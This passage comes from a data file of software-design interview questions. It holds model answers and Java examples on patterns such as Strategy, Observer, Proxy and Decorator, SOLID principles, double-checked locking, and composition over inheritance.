        public Builder name(String name) { this.name = name; return this; }
        public Builder email(String email) { this.email = email; return this; }
        public Builder role(String role) { this.role = role; return this; }
        public User build() { return new User(this); }
    }
}

User user = new User.Builder()
    .name("Alice")
    .email("alice@mail.com")
    .role("ADMIN")
    .build();</pre>
<div class="key-point">Builder is ideal when parameter count grows and constructor calls become hard to read safely.</div>`,
      },
      {
        q: 'What is the Strategy pattern and when do you use it?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>Strategy captures a family of interchangeable algorithms behind one interface and lets you pick or swap them at runtime — think payment methods, sorting comparators, or pricing rules. Its real value is killing big <code>if/else</code> or <code>switch</code> chains on a type code: each branch becomes a strategy class, so adding a behavior is a new class rather than an edit to existing code (Open/Closed), and each algorithm is independently testable. In modern languages a strategy is often just a lambda or function you pass in, so you don't always need a formal hierarchy. The distinction to hold onto is Strategy vs State: same structure, but a Strategy is chosen by the client while a State transitions itself based on lifecycle.</p></div>
<p><strong>Strategy</strong> encapsulates interchangeable algorithms behind a common interface.</p>
<pre>interface DiscountStrategy {
    double apply(double price);
}

class MemberDiscount implements DiscountStrategy {
    public double apply(double price) { return price * 0.9; }
}

class HolidayDiscount implements DiscountStrategy {
    public double apply(double price) { return price * 0.8; }
}

class CheckoutService {
    private final DiscountStrategy strategy;

    CheckoutService(DiscountStrategy strategy) {
        this.strategy = strategy;
    }

    double total(double price) {
        return strategy.apply(price);
    }
}</pre>
<div class="key-point">Strategy is great for removing large if/else blocks around changing business rules.</div>`,
      },
      {
        q: 'What is the difference between Strategy and State?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Structurally they're near-identical — an object delegating to a swappable behavior interface — so interviewers use the difference to test whether you understand intent, not UML. Strategy is about choosing one of several interchangeable algorithms, and the client picks it; the strategies don't know about each other or change themselves. State is about an object behaving differently depending on its current lifecycle state, and crucially the states drive their own transitions — one state hands control to the next, like a document going draft to review to published. So the tell is: is the behavior selected once from outside (Strategy), or does it evolve as part of an internal state machine where behaviors know their successors (State)?</p></div>
<ul>
<li><strong>Strategy</strong>: choose one behavior among alternatives.</li>
<li><strong>State</strong>: behavior changes based on current lifecycle state.</li>
</ul>
<pre>// Strategy: chosen from outside
CheckoutService checkout = new CheckoutService(new MemberDiscount());

// State: behavior changes inside the object
interface OrderState {
    void next(Order order);
}

class CreatedState implements OrderState {
    public void next(Order order) {
        order.setState(new PaidState());
    }
}

class PaidState implements OrderState {
    public void next(Order order) {
        System.out.println("Ship order");
    }
}

class Order {
    private OrderState state = new CreatedState();
    void setState(OrderState state) { this.state = state; }
    void next() { state.next(this); }
}</pre>
<div class="key-point">If behavior depends on object lifecycle transitions, it is usually State, not Strategy.</div>`,
      },
      {
        q: 'What is the Observer pattern?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>Observer sets up a one-to-many notification: a subject keeps a list of observers and pushes updates when its state changes, so dependents stay in sync without the subject knowing their concrete types — loose coupling. It's the backbone of event listeners, UI data binding, and reactive frameworks; RxJS and the reactive-streams world are Observer scaled up. The gotchas I watch for are memory leaks from observers that never unsubscribe (the lapsed-listener problem), surprising update cascades and ordering issues, and doing heavy work synchronously in the notification. The distinction to draw is Observer — in-process, subject holds direct references — versus Pub/Sub, where a broker decouples publishers and subscribers entirely.</p></div>
<p><strong>Observer</strong> defines a one-to-many dependency so observers are notified when subject state changes.</p>
<pre>interface Observer {
    void update(String event);
}

class EmailObserver implements Observer {
    public void update(String event) {
        System.out.println("Email received: " + event);
    }
}

class OrderSubject {
    private final java.util.List&lt;Observer&gt; observers = new java.util.ArrayList&lt;&gt;();

    void addObserver(Observer observer) {
        observers.add(observer);
    }

    void notifyObservers(String event) {
        for (Observer observer : observers) {
            observer.update(event);
        }
    }
}</pre>
<div class="key-point">Observer is common in UI events and in-process event systems.</div>`,
      },
      {
        q: 'What is the difference between Observer and Pub/Sub?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Same idea — notify interested parties on an event — but different coupling and scope. Observer is an in-process pattern where the subject holds direct references to its observers and calls them; they know about each other, it's synchronous, and it lives inside one application. Pub/Sub introduces a broker in the middle: publishers emit to a topic and subscribers listen on it, the two never know about each other, and it typically works across processes or machines, asynchronously. So the rule of thumb is Observer for in-memory event notification within an app, Pub/Sub for distributed, decoupled messaging between services. The tradeoff Pub/Sub adds is broker infrastructure, delivery guarantees, and eventual consistency.</p></div>
<ul>
<li><strong>Observer</strong>: in-process object pattern.</li>
<li><strong>Pub/Sub</strong>: distributed messaging architecture using a broker.</li>
</ul>
<pre>// Observer: direct in-memory subscription
OrderSubject subject = new OrderSubject();
subject.addObserver(new EmailObserver());
subject.notifyObservers("Order shipped");

// Pub/Sub: publisher talks to broker, not direct subscribers
class EventBus {
    void publish(String topic, String event) {
        System.out.println("Published to " + topic + ": " + event);
    }
}

new EventBus().publish("orders", "OrderShipped");</pre>
<div class="key-point">They are similar in idea but very different in runtime, scalability, and failure behavior.</div>`,
      },
      {
        q: 'What is the Adapter pattern?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Adapter is the plug converter: it wraps an existing class and translates its interface into the one your client expects, so two incompatible things work together without changing either. I reach for it constantly when integrating third-party or legacy code — wrap the vendor SDK behind your own interface, which also gives you a seam to mock in tests and one place to swap vendors. The key point about intent: Adapter changes an interface without changing behavior, Decorator keeps the interface but adds behavior, and Facade simplifies a whole subsystem. It's structural glue, so the only real gotcha is a leaky adapter that lets the adaptee's quirks bleed through.</p></div>
<p><strong>Adapter</strong> converts one interface into another interface expected by the client.</p>
<pre>class LegacyPaymentApi {
    void makePayment(int cents) {
        System.out.println("Legacy paid: " + cents);
    }
}

interface PaymentProcessor {
    void pay(int amount);
}

class PaymentAdapter implements PaymentProcessor {
    private final LegacyPaymentApi legacy = new LegacyPaymentApi();

    public void pay(int amount) {
        legacy.makePayment(amount * 100);
    }
}</pre>
<div class="key-point">Use Adapter when integrating old or third-party APIs without changing the rest of your code.</div>`,
      },
      {
        q: 'What is the Facade pattern?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Facade gives you one simple front door to a complex subsystem — the client calls a couple of clean methods instead of orchestrating a dozen collaborating classes. The value is reduced coupling: clients depend on the facade, not the internals, so you can refactor behind it freely, and it's a natural boundary between layers or around a messy library. The distinction I keep straight: Facade simplifies and can front many objects but doesn't hide them (you can still reach past it), Adapter converts one interface to another, and Proxy keeps the same interface to control access. The anti-pattern is a god-facade that accretes every operation in the system into one bloated class.</p></div>
<p><strong>Facade</strong> provides a simplified interface over a complex subsystem.</p>
<pre>class InventoryService {
    void reserve(String item) { System.out.println("Reserved " + item); }
}

class PaymentService {
    void charge(int amount) { System.out.println("Charged " + amount); }
}

class EmailService {
    void sendReceipt() { System.out.println("Receipt sent"); }
}

class CheckoutFacade {
    private final InventoryService inventory = new InventoryService();
    private final PaymentService payment = new PaymentService();
    private final EmailService email = new EmailService();

    void checkout(String item, int amount) {
        inventory.reserve(item);
        payment.charge(amount);
        email.sendReceipt();
    }
}</pre>
<div class="key-point">Facade reduces client complexity and centralizes orchestration.</div>`,
      },
      {
        q: 'What is the Proxy pattern?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Proxy stands in for the real object with the identical interface, so the client can't tell the difference, and it interposes to control access — that's the point. The flavors map to real uses: virtual proxy for lazy or expensive initialization (Hibernate lazy loading), protection proxy for access control, remote proxy for network calls (RPC stubs), and caching or logging proxies for cross-cutting concerns. It's essentially how AOP and Spring's transactional and security proxies work under the hood. Versus its siblings: Proxy keeps the same interface and controls access, Decorator keeps the interface but adds behavior, Adapter changes the interface. The gotcha is a proxy that silently changes performance — a lazy proxy triggering surprise queries, for instance.</p></div>
<p><strong>Proxy</strong> keeps the same interface as the real object but controls access to it.</p>
<ul>
<li>Lazy loading</li>
<li>Security checks</li>
<li>Remote calls</li>
<li>Logging or transaction interception</li>
</ul>
<pre>interface Image {
    void display();
}

class RealImage implements Image {
    private final String fileName;

    RealImage(String fileName) {
        this.fileName = fileName;
        System.out.println("Loading " + fileName);
    }

    public void display() {
        System.out.println("Displaying " + fileName);
    }
}

class ImageProxy implements Image {
    private RealImage realImage;
    private final String fileName;

    ImageProxy(String fileName) {
        this.fileName = fileName;
    }

    public void display() {
        if (realImage == null) realImage = new RealImage(fileName);
        realImage.display();
    }
}</pre>
<div class="key-point">Spring AOP and many ORM lazy-loading features are classic proxy examples.</div>`,
      },
      {
        q: 'What is the Decorator pattern?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Decorator wraps an object in another object that shares its interface and adds behavior, letting you compose features at runtime instead of exploding the class hierarchy with a subclass per combination. The canonical example is Java's I/O streams — a <code>BufferedInputStream</code> wrapping a <code>FileInputStream</code> — and it's the clean alternative to inheritance when you'd otherwise need a BufferedEncryptedCompressedStream-style explosion. Because each decorator is small and single-purpose it's very Single-Responsibility and Open/Closed friendly. Versus Proxy (same interface, controls access) and Adapter (changes the interface), Decorator keeps the interface and enriches behavior. The gotchas are deep wrapping chains that are hard to debug and identity checks breaking because the object isn't the raw type anymore.</p></div>
<p><strong>Decorator</strong> adds behavior to an object without changing its class.</p>
<pre>interface Coffee {
    String description();
    int cost();
}

class BasicCoffee implements Coffee {
    public String description() { return "Coffee"; }
    public int cost() { return 50; }
}

class MilkDecorator implements Coffee {
    private final Coffee coffee;

    MilkDecorator(Coffee coffee) {
        this.coffee = coffee;
    }

    public String description() { return coffee.description() + ", Milk"; }
    public int cost() { return coffee.cost() + 10; }
}</pre>
<div class="key-point">Decorator is useful when behavior must be combined flexibly at runtime.</div>`,
      },
      {
        q: 'What is the Template Method pattern?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Template Method fixes the skeleton of an algorithm in a base class and lets subclasses fill in specific steps via overridable hooks — the overall sequence stays put, only the varying steps change. It's the classic "don't call us, we'll call you" inversion, great for frameworks: a base test runner's setup/run/teardown, or a data pipeline where only the parse or transform step differs. The value is factoring out duplicated structure while letting the pieces vary. The tradeoff, and it's a big one for a senior, is that it's inheritance-based, so it carries inheritance's coupling and fragile-base-class risks — often Strategy (composition, inject the varying step) is the more flexible modern choice for the same goal.</p></div>
<p><strong>Template Method</strong> defines the skeleton of an algorithm in a base class while subclasses customize steps.</p>
<pre>abstract class FileProcessor {
    public final void process() {
        read();
        transform();
        save();
    }

    abstract void read();
    abstract void transform();

    void save() {
        System.out.println("Saved file");
    }
}

class CsvProcessor extends FileProcessor {
    void read() { System.out.println("Read CSV"); }
    void transform() { System.out.println("Transform CSV"); }
}</pre>
<div class="key-point">Use Template Method when the algorithm flow stays stable but some steps vary.</div>`,
      },
      {
        q: 'What is the Chain of Responsibility pattern?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Chain of Responsibility passes a request along a line of handlers, each deciding to handle it or pass it on, so the sender is decoupled from whoever ultimately handles it and you can reconfigure the chain freely. The everyday example everyone actually uses is middleware — Express, servlet filters, HTTP interceptor pipelines — where auth, logging, and validation are links in a chain. It shines when the set or order of processing steps should be flexible and each step is independent. The gotchas: a request can fall off the end unhandled, so you need a default or explicit termination, and long chains hurt debuggability and performance since every link is touched. It's the pattern behind most request-processing pipelines.</p></div>
<p><strong>Chain of Responsibility</strong> passes a request through a chain of handlers until one handles it or the chain ends.</p>
<pre>abstract class Handler {
    private Handler next;

    public Handler linkWith(Handler next) {
        this.next = next;
        return next;
    }

    public void handle(String request) {
        process(request);
        if (next != null) next.handle(request);
    }

    protected abstract void process(String request);
}

class AuthHandler extends Handler {
    protected void process(String request) {
        System.out.println("Auth check: " + request);
    }
}

class AuditHandler extends Handler {
    protected void process(String request) {
        System.out.println("Audit log: " + request);
    }
}</pre>
<div class="key-point">HTTP middleware and servlet filters are common real-world examples.</div>`,
      },
      {
        q: 'What is the Repository pattern?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Repository puts a collection-like interface in front of persistence, so your domain talks to something like <code>orders.findById()</code> instead of SQL or an ORM directly — that decouples the domain from storage and gives you a clean seam to mock in tests. The honest caveat is that it's frequently over-applied: if you're wrapping a mature ORM like EF or JPA that already implements this pattern, a thin passthrough repository is often redundant ceremony. It earns its keep when you have real domain logic to protect, multiple data sources, or you're doing DDD with aggregates. The classic anti-pattern is a generic <code>Repository&lt;T&gt;</code> with a giant leaky query API that just re-exposes the ORM — at that point it's abstraction theater.</p></div>
<p><strong>Repository</strong> abstracts data access behind a collection-like interface, decoupling business logic from persistence details.</p>
<pre>// Without Repository: business logic knows about JPA
entityManager.createQuery("SELECT u FROM User u WHERE u.email = :email")
    .setParameter("email", email)
    .getSingleResult();

// With Repository: clean abstraction
interface UserRepository {
    Optional&lt;User&gt; findByEmail(String email);
    List&lt;User&gt; findByRole(String role);
    void save(User user);
    void delete(User user);
}

class JpaUserRepository implements UserRepository {
    private final EntityManager em;

    public Optional&lt;User&gt; findByEmail(String email) {
        return em.createQuery("SELECT u FROM User u WHERE u.email = :email", User.class)
            .setParameter("email", email)
            .getResultStream().findFirst();
    }
    // ...
}

// Business logic only depends on interface:
class UserService {
    private final UserRepository repo; // can swap JPA → MongoDB → in-memory

    User register(String email) {
        if (repo.findByEmail(email).isPresent()) throw new DuplicateEmailException();
        User user = new User(email);
        repo.save(user);
        return user;
    }
}</pre>
<div class="key-point">Repository makes business logic testable (inject a fake repo in tests) and allows swapping persistence technology without changing domain code. Spring Data JPA auto-generates repository implementations.</div>`,
      },
      {
        q: 'What is Dependency Injection and how does it relate to design patterns?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>DI just means a class receives its dependencies from outside — usually via the constructor — instead of building them itself with <code>new</code>. That inversion is what makes code loosely coupled and testable: you can inject a mock or a different implementation without touching the class. It's the concrete mechanism behind the Dependency Inversion principle (depend on abstractions, not concretions) and is closely tied to Inversion of Control and the Strategy pattern. I strongly prefer constructor injection over field or setter injection because it makes dependencies explicit and lets you build immutable, fully-initialized objects. And DI is a technique you can do by hand — a container is convenience, not a requirement, and over-configured containers with magic autowiring are their own maintainability trap.</p></div>
<p><strong>Dependency Injection (DI)</strong> provides dependencies from outside rather than creating them inside, enabling loose coupling and testability.</p>
<pre>// ❌ Without DI: tight coupling
class OrderService {
    private EmailService emailService = new EmailService(); // hardcoded dependency
    private PaymentGateway gateway = new StripeGateway();   // can't swap easily
}

// ✅ With DI: dependencies injected
class OrderService {
    private final EmailService emailService;
    private final PaymentGateway gateway;

    // Constructor injection (preferred)
    OrderService(EmailService emailService, PaymentGateway gateway) {
        this.emailService = emailService;
        this.gateway = gateway;
    }
}

// Production: new OrderService(new SmtpEmailService(), new StripeGateway())
// Testing:    new OrderService(new MockEmailService(), new MockGateway())</pre>
<p><strong>DI types:</strong></p>
<ul>
<li><strong>Constructor injection</strong> (recommended): all dependencies in constructor, object is always valid</li>
<li><strong>Setter injection</strong>: optional dependencies, can change at runtime</li>
<li><strong>Field injection</strong>: Spring @Autowired on fields — convenient but harder to test</li>
</ul>
<div class="key-point">DI applies the Dependency Inversion Principle (the "D" in SOLID): depend on abstractions, not concrete classes. Spring, Angular, and .NET all have built-in DI containers.</div>`,
      },
      {
        q: 'What are SOLID principles? Give a brief example of each.',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>SOLID is five principles for managing change and coupling. SRP — a class should have one reason to change, so keep responsibilities cohesive. OCP — open for extension, closed for modification, add behavior via new code rather than editing tested code. LSP — subtypes must be substitutable for their base without breaking callers (the square/rectangle trap). ISP — many small focused interfaces beat one fat one, so clients don't depend on methods they don't use. DIP — depend on abstractions, not concretions, which is what DI enables. The senior framing is that these are heuristics serving one goal, isolating change, not laws — dogmatically maximizing them gives you a swamp of tiny interfaces and indirection, so apply them where change actually happens.</p></div>
<p>SOLID is five object-oriented design principles that make code more maintainable:</p>
<pre>S - Single Responsibility: One class = one reason to change
  ❌ UserService handles login, email sending, and PDF generation
  ✅ UserService handles login; EmailService handles email; PdfService handles PDF

O - Open/Closed: Open for extension, closed for modification
  ❌ if (type == "pdf") ... else if (type == "csv") ... // modify to add new type
  ✅ interface Exporter { void export(); } // extend by adding new class

L - Liskov Substitution: Subtype must work wherever parent type is expected
  ❌ class Square extends Rectangle { setWidth() { also sets height } }
     // violates: Rectangle user expects width/height to be independent
  ✅ Use separate Shape interface for Square and Rectangle

I - Interface Segregation: Don't force classes to implement methods they don't use
  ❌ interface Worker { void code(); void manageMeetings(); void cook(); }
  ✅ interface Coder { void code(); }
     interface Manager { void manageMeetings(); }

D - Dependency Inversion: Depend on abstractions, not concretions
  ❌ class OrderService { private MySqlRepo repo = new MySqlRepo(); }
  ✅ class OrderService { private Repository repo; // interface injected }</pre>
<div class="key-point">SOLID principles are heavily asked in interviews. Know one concrete example for each. The most commonly tested are Single Responsibility (S) and Dependency Inversion (D).</div>`,
      },
      {
        q: 'What is the difference between Adapter, Facade, and Proxy patterns?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>All three are structural wrappers, and the distinction is purely intent. Adapter changes the interface — it makes an incompatible class fit the interface your client expects, glue for integration. Facade simplifies — it puts one easy interface over a whole complex subsystem to reduce coupling, fronting many objects. Proxy preserves the interface exactly and controls access — lazy loading, caching, access control, remoting — and the client shouldn't even know it's there. The quick test: different interface is Adapter, a simpler interface over many things is Facade, same interface with a gatekeeper is Proxy. And Decorator is the fourth cousin — same interface, but adding behavior rather than controlling access.</p></div>
<p>All three wrap another object, but for <strong>different reasons</strong>:</p>
<table><tr><th>Pattern</th><th>Purpose</th><th>Interface</th><th>Example</th></tr>
<tr><td><strong>Adapter</strong></td><td>Convert incompatible interface</td><td>Changes interface</td><td>Legacy API → new interface</td></tr>
<tr><td><strong>Facade</strong></td><td>Simplify complex subsystem</td><td>New simplified interface</td><td>checkout() wraps 5 services</td></tr>
<tr><td><strong>Proxy</strong></td><td>Control access to real object</td><td>Same interface as real</td><td>Lazy load, security check, caching</td></tr></table>
<pre>// Adapter: makes incompatible interface compatible
class OldPaymentAdapter implements NewPaymentInterface {
    private OldPaymentSystem old;
    void pay(Money m) { old.makePayment(m.toCents()); } // adapts interface
}

// Facade: simplifies multiple subsystems
class OrderFacade {
    void placeOrder() {
        inventoryService.reserve();  // hides complexity
        paymentService.charge();     // of multiple services
        emailService.notify();       // behind one method
    }
}

// Proxy: same interface, adds behavior
class CachingUserProxy implements UserService {
    private UserService real;
    User getUser(int id) {
        if (cache.has(id)) return cache.get(id);  // adds caching
        return real.getUser(id);                    // same interface
    }
}</pre>
<div class="key-point">Trick question tip: If asked "which pattern wraps another object?" — all three do! The difference is WHY: Adapter = interface mismatch, Facade = simplification, Proxy = access control.</div>`,
      },
      {
        q: 'Why is double-checked locking broken without volatile?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>This is a memory-model bug, not a logic bug. The idea is to check the instance, synchronize only if null, then check again — avoiding a lock on the hot path. The trap is that <code>instance = new Singleton()</code> isn't atomic: the JVM can allocate memory and publish the reference before the constructor finishes, so another thread sees a non-null but half-initialized object. <code>volatile</code> fixes it by inserting the happens-before memory barrier that prevents that reordering and guarantees visibility. Without it the code looks correct, passes tests, then fails rarely under load — the worst kind of bug. Honestly, in Java I'd sidestep the whole thing with the initialization-on-demand holder idiom or an enum, which are lazy and thread-safe for free.</p></div>
<p>The classic Java singleton trap. Double-checked locking tries to avoid synchronizing on every <code>getInstance()</code> call — but without <code>volatile</code> it can return a <strong>half-constructed object</strong>.</p>
<pre>// BROKEN without volatile:
class Singleton {
    private static Singleton instance;   // ← missing volatile!

    static Singleton getInstance() {
        if (instance == null) {                  // 1st check (no lock)
            synchronized (Singleton.class) {
                if (instance == null) {          // 2nd check (locked)
                    instance = new Singleton();  // ← the problem
                }
            }
        }
        return instance;
    }
}

// "instance = new Singleton()" is NOT atomic. It's roughly:
//   1. allocate memory
//   2. run constructor (initialize fields)
//   3. assign reference to 'instance'
// The JIT/CPU may REORDER 2 and 3. So Thread A can publish
// the reference (step 3) BEFORE the constructor ran (step 2).
// Thread B sees instance != null at the 1st check (no lock,
// no happens-before!) and happily uses an object whose fields
// are still default values (null/0). Rare, non-reproducible, brutal.</pre>
<pre>// Fix 1: volatile — forbids the reorder, creates happens-before
private static volatile Singleton instance;

// Fix 2 (better): initialization-on-demand holder — lazy, fast, no locks
class Singleton {
    private static class Holder {
        static final Singleton INSTANCE = new Singleton();
    }
    static Singleton getInstance() { return Holder.INSTANCE; }
    // JVM class-loading guarantees safe, lazy, once-only init
}

// Fix 3 (Effective Java): enum singleton
enum Singleton {
    INSTANCE;
    void doWork() { ... }
    // serialization-safe and reflection-safe for free
}</pre>
<p><strong>Why interviewers love it:</strong> it tests whether you understand the Java Memory Model — that <code>null</code>-checks without synchronization give no visibility guarantees, and that object publication is a memory-ordering problem, not a logic problem.</p>
<div class="key-point">Without <code>volatile</code>, instruction reordering can publish the reference before the constructor finishes — another thread sees a non-null, half-built object. Prefer the holder idiom or an enum over hand-rolled double-checked locking.</div>`,
      },
      {
        q: 'Why favor composition over inheritance?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>The core reason is that inheritance is the tightest coupling there is — a subclass depends on the parent's implementation details, not just its interface, so a base-class change can silently break subclasses (the fragile base class problem). The <code>InstrumentedHashSet</code> example shows it: overriding one method breaks because the parent calls its own methods internally. Composition — holding an object and delegating — depends only on the collaborator's public interface, so it's more robust and flexible at runtime, where inheritance is fixed at compile time. My rule is to inherit only for a genuine "is-a" with a stable base designed for extension, and otherwise favor "has-a." It's Effective Java Item 18, and it's also why Strategy and Decorator exist.</p></div>
<p>Inheritance couples your class to the <strong>implementation details</strong> of the parent — the "fragile base class" problem. The canonical demonstration is <code>InstrumentedHashSet</code> from <em>Effective Java</em>:</p>
<pre>// BROKEN: inheritance leaks the parent's self-calls
class InstrumentedHashSet&lt;E&gt; extends HashSet&lt;E&gt; {
    private int addCount = 0;

    @Override public boolean add(E e) {
        addCount++;
        return super.add(e);
    }
    @Override public boolean addAll(Collection&lt;? extends E&gt; c) {
        addCount += c.size();
        return super.addAll(c);   // ← HashSet.addAll calls add()
    }                             //   internally... OUR add()!
}

InstrumentedHashSet&lt;String&gt; s = new InstrumentedHashSet&lt;&gt;();
s.addAll(List.of("a", "b", "c"));
s.getAddCount();  // 6, not 3! Counted once in addAll, once per add()

// Worse: this depends on an UNDOCUMENTED detail of HashSet.
// If a JDK update changes addAll to not call add(), the count
// silently becomes 3. Your correctness depends on code you
// don't own and can't see.</pre>
<pre>// FIX: composition + delegation (wrapper / decorator style)
class InstrumentedSet&lt;E&gt; implements Set&lt;E&gt; {
    private final Set&lt;E&gt; inner;      // HAS-A, not IS-A
    private int addCount = 0;

    InstrumentedSet(Set&lt;E&gt; inner) { this.inner = inner; }

    public boolean add(E e) { addCount++; return inner.add(e); }
    public boolean addAll(Collection&lt;? extends E&gt; c) {
        addCount += c.size();
        return inner.addAll(c);  // inner's self-calls stay inside
    }                            // inner — can't re-enter our code
    // ...delegate the rest
}
// Bonus: works with ANY Set (HashSet, TreeSet, ...), not just one parent</pre>
<p><strong>The deeper reasons:</strong></p>
<ul>
<li>Inheritance is decided at compile time and you get exactly one parent; composition can be swapped at runtime and combined freely.</li>
<li>Subclassing breaks encapsulation: overriding requires knowing the parent's internal call graph.</li>
<li>Inheritance means the subclass must honor the parent's full contract (LSP) — often you only wanted to reuse some code.</li>
</ul>
<p><strong>When inheritance IS right:</strong> a genuine is-a relationship where the base class is <em>designed and documented for extension</em> (or abstract with template methods). Otherwise, per Effective Java: "design and document for inheritance or else prohibit it."</p>
<div class="key-point">Inheritance couples you to the parent's hidden self-call patterns — a JDK update can break your subclass. Composition forwards calls across a hard boundary, so you depend only on the public contract.</div>`,
      },
      {
        q: 'What is the Anemic Domain Model anti-pattern?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Anemic domain model is when your domain objects are just data bags — getters and setters, no behavior — and all the logic lives in service classes operating on them. Fowler flagged it as an anti-pattern because it looks object-oriented but is procedural: it breaks encapsulation by exposing all state and scatters the rules that protect that state across services, so invariants aren't guarded at the source. The fix is to push behavior back onto the entities — a rich model where an <code>Order</code> knows how to <code>cancel()</code> itself and enforces its own invariants. The nuance I'd say out loud: anemic is genuinely fine for simple CRUD; it only bites when there's real domain complexity, which is exactly where DDD pushes back.</p></div>
<p>An <strong>Anemic Domain Model</strong> (named by Martin Fowler) is when your "domain objects" are just getter/setter bags with zero behavior, and ALL business logic lives in service classes. It looks object-oriented but is procedural code wearing an OO costume.</p>
<pre>// ANEMIC: the entity knows nothing, the service knows everything
class Order {                       // just a data bag
    private String status;
    private List&lt;OrderLine&gt; lines;
    // getters and setters... that's it
}

class OrderService {
    void cancel(Order order) {
        // business rules scattered in the service layer:
        if (order.getStatus().equals("SHIPPED"))
            throw new IllegalStateException("too late");
        order.setStatus("CANCELLED");     // anyone can also just
    }                                     // call setStatus("X")!
}
// Problem: NOTHING stops other code from doing
// order.setStatus("CANCELLED") on a shipped order.
// The invariant lives in one service method, hopefully.</pre>
<pre>// RICH domain model: the entity protects its own invariants
class Order {
    private OrderStatus status;
    private final List&lt;OrderLine&gt; lines = new ArrayList&lt;&gt;();

    public void cancel() {
        if (status == OrderStatus.SHIPPED)
            throw new OrderAlreadyShippedException(id);
        this.status = OrderStatus.CANCELLED;
        registerEvent(new OrderCancelled(id));
    }
    public Money total() {
        return lines.stream().map(OrderLine::subtotal)
                    .reduce(Money.ZERO, Money::add);
    }
    // NO setStatus()! Invalid states are unrepresentable.
}
// The service shrinks to orchestration:
//   load → order.cancel() → save → publish events</pre>
<p><strong>Why it matters:</strong> with anemic models, invariants are enforced "by convention" across many services — each new code path is a chance to corrupt state. A rich model makes the compiler enforce them: there is simply no public mutator that allows an illegal transition.</p>
<p><strong>Why it's debated (say this in the interview):</strong></p>
<ul>
<li>For <strong>simple CRUD</strong> apps, anemic + services is honest and fine — don't force ceremony onto forms-over-data.</li>
<li>Logic spanning many aggregates genuinely belongs in domain services.</li>
<li>Some ORMs and serializers push you toward no-arg constructors and setters; rich models take deliberate effort.</li>
</ul>
<div class="key-point">Anemic models scatter invariants across services where any caller can bypass them; rich models make illegal states unrepresentable — but judge by complexity: rich domain for complex business rules, plain CRUD for plain CRUD.</div>`,
      },
      {
        q: 'When should you NOT use a design pattern?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>The right answer is that patterns are vocabulary, not goals — every one buys flexibility by adding indirection, and indirection has a permanent readability and maintenance cost. So you don't use one until the force it addresses actually shows up: no Strategy for the one algorithm you'll ever have, no factory "in case" the type changes, no abstraction for a single implementation (YAGNI). Speculative generality — pattern-itis — is a real code smell that makes simple code hard to follow. My rule is to write the simplest thing that works and refactor toward a pattern when duplication or a second variation forces it. The maturity signal is choosing NOT to, and being able to name the cost you're avoiding.</p></div>
<p>A favorite senior filter-question. The wrong answer is a blank stare; the right answer is that <strong>patterns are vocabulary, not goals</strong> — each one buys flexibility by adding indirection, and indirection has a permanent readability cost.</p>
<pre>// Resume-driven design: a Strategy/Factory layer-cake...
interface DiscountStrategy { BigDecimal apply(BigDecimal price); }
class RegularDiscountStrategy implements DiscountStrategy { ... }
class PremiumDiscountStrategy implements DiscountStrategy { ... }
class DiscountStrategyFactory {
    static DiscountStrategy create(CustomerType type) { ... }
}
class DiscountContext {
    private DiscountStrategy strategy;  // 4 files, 2 indirections
    ...
}

// ...for logic that was, and will remain, this:
BigDecimal discount(CustomerType type, BigDecimal price) {
    switch (type) {
        case PREMIUM: return price.multiply(new BigDecimal("0.10"));
        case REGULAR: return price.multiply(new BigDecimal("0.05"));
        default:      return BigDecimal.ZERO;
    }
}
// Two stable cases. The switch is readable in 5 seconds.
// The pattern version makes readers chase 4 files to learn
// the same thing — and both versions change the same amount
// of code when a rule changes.</pre>
<p><strong>Don't reach for a pattern when:</strong></p>
<ul>
<li><strong>The axis of change is speculative</strong> — YAGNI. Flexibility for changes that never come is pure cost. Refactor <em>to</em> a pattern when the third variant actually arrives ("Rule of Three").</li>
<li><strong>The pattern is bigger than the problem</strong> — an if/else beats a Strategy for 2 stable branches; a constructor with named parameters beats a Builder for 3 fields.</li>
<li><strong>The language already solved it</strong> — Strategy is just a lambda/function parameter in Java 8+/TypeScript; Observer is built into every event system; Singleton is a DI-container scope.</li>
<li><strong>You're pattern-matching the name, not the forces</strong> — patterns are solutions to specific tensions; applying one without the tension is cargo culting.</li>
</ul>
<p><strong>How to frame it:</strong> patterns emerged as <em>descriptions</em> of good solutions, not prescriptions. Their biggest everyday value is communication — saying "this is a decorator" compresses a design conversation. Interviewers often follow up with: "show me a pattern you removed." Have a story.</p>
<div class="key-point">Every pattern trades readability for flexibility along one axis of change — if that axis never changes, you paid the cost for nothing. Write the simple thing; refactor to the pattern when the second or third real variant shows up.</div>`,
      },
      {
        q: 'What is a God Object, and what does the Law of Demeter say about train wrecks?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>A God Object is a class that knows and does too much — it centralizes responsibilities that should be spread out, so everything depends on it, it can't be tested in isolation, and every change touches it. It's the ultimate SRP violation and usually grows by accretion. The Law of Demeter — "only talk to your immediate friends" — targets the related smell: train wrecks like <code>order.getCustomer().getAddress().getCity()</code>, where reaching through a chain couples you to the whole object graph's structure, so a change deep in that chain ripples out. The fix for both is "tell, don't ask": give objects behavior instead of pulling their guts out, and delegate. The caveat is that data structures and fluent builders legitimately chain, so LoD isn't an absolute rule about dots.</p></div>
<p>Two related coupling smells that interviewers probe together.</p>
<p><strong>God Object</strong>: one class that knows too much and does too much — <code>AppManager</code>, <code>Utils</code>, a 4000-line <code>OrderService</code> touching pricing, inventory, email, and PDF generation. Every change routes through it, so it has maximal merge conflicts, untestable constructor dependencies, and no single reason to change (violates SRP by definition).</p>
